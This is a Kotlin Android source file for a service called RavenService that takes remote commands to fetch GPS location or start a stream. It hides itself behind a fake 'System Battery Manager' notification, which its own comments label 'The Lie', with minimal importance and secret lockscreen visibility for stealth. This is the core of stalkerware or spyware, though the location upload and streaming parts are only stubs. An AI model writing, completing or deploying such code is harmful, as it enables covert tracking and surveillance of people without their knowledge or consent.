package com.project.raven

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class RavenService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 1. Immediately post the "Disguise" notification to satisfy Android OS
        startForeground(1337, createDisguiseNotification())

        val command = intent?.action

        // 2. Execute the command
        serviceScope.launch {
            when (command) {
                "GET_LOCATION" -> handleLocation()
                "START_STREAM" -> handleStreaming() // Keeps running
                else -> {
                    // If unknown or just a ping, wait 5 seconds then die
                    delay(5000) 
                    stopSelf() 
                }
            }
        }

        // If we are just doing a quick task, we don't need START_STICKY.
        // We want to die after the work is done to save battery/stealth.
        return START_NOT_STICKY
    }

    private suspend fun handleLocation() {
        // TODO: Fetch GPS logic here
        // uploadLocation()
        delay(2000) // Fake work time
        stopSelf() // KILL SELF: Notification disappears, app goes dormant
    }

    private suspend fun handleStreaming() {
        // Streaming keeps the service alive until explicitly stopped
        // Do NOT call stopSelf() here
    }

    private fun createDisguiseNotification(): Notification {
        val channelId = AppConfig.CHANNEL_ID
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, AppConfig.CHANNEL_NAME, NotificationManager.IMPORTANCE_MIN)
            chan.lockscreenVisibility = Notification.VISIBILITY_SECRET
            chan.setShowBadge(false)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(chan)
        }

        return NotificationCompat.Builder(this, channelId)
            .setOngoing(true)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentTitle("System Battery Manager")
            .setContentText("Optimizing background processes...") // The Lie
            .setPriority(NotificationManager.IMPORTANCE_MIN) // Silent
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
